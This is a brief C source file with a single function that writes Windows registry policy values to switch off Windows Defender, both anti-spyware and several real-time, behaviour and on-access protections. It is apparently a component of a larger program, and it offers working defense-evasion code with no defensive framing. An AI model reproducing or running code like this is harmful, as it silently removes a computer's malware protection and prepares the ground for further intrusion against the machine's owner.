#include "native.h"
#include "Windows.h"
#include "winreg.h"
void DisableDefender(int disable)
{
    HKEY key;
    HKEY new_key;
    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
    if (res == ERROR_SUCCESS)
    {
        RegSetValueEx(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE *)&disable, sizeof(disable));
        RegCreateKeyEx(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
        RegSetValueEx(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE *)&disable, sizeof(disable));
        RegSetValueEx(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE *)&disable, sizeof(disable));
        RegSetValueEx(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE *)&disable, sizeof(disable));
        RegSetValueEx(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE *)&disable, sizeof(disable));
        RegSetValueEx(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE *)&disable, sizeof(disable));

        RegCloseKey(key);
        RegCloseKey(new_key);
    }
}